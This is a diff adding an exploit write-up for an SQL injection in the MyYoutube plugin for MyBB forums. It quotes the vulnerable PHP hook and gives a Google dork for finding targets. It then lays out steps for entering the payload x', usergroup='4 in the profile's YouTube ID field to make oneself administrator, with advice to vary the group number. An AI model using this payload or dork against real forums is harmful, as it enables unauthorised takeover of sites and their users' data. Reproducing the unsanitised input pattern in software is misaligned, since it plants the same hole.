@@ -1,0 +1,49 @@
+# Exploit Title: MyYoutube MyBB plugin SQL UPDATE injection.
+# Google Dork: inurl:member.php intext:"Youtube Video" intitle:"Profile of"
+# Date: 12.10.2012
+# Exploit Author: Zixem
+# Vendor Homepage: http://www.mybb-es.com
+# Software Link: http://mods.mybb.com/view/myyoutube
+# Version: 1.0
+# Tested on: Linux.
+
+MyYoutube plugin suffers from POST SQL UPDATE injection.
+
+The vulnerabillity exist within youtube.php :
+<?php
+
+$plugins->add_hook("datahandler_user_update", "youtube_update"); /*Line 8*/ 
+
+function youtube_update($ytb) /*Line 128*/
+ {
+ 	global $mybb;
+ 	if(isset($mybb->input['ytb']))
+	{
+		$ytb->user_update_data['ytb'] = $mybb->input['ytb'];
+	}
+}
+
+?>
+
+Insturctions:
+(1) Go to usercp.php?action=profile
+
+(2) http://i.imgur.com/gPYdq.png
+Enter this in the youtube ID field(just like in the picture): x', usergroup='4
+
+(3) Press on the update button.
+
+(4) You're an admin now :3
+
+
+If you're still not admins, just play with the number...on my pentest forum, the admins usergroup number is 4.
+
+PoC: 
+before: http://i.imgur.com/aPFsz.png
+While exploiting: http://i.imgur.com/gPYdq.png
+Result: http://i.imgur.com/4ezpF.png
+
+
+http://twitter.com/z1xem
+
+-Zixem
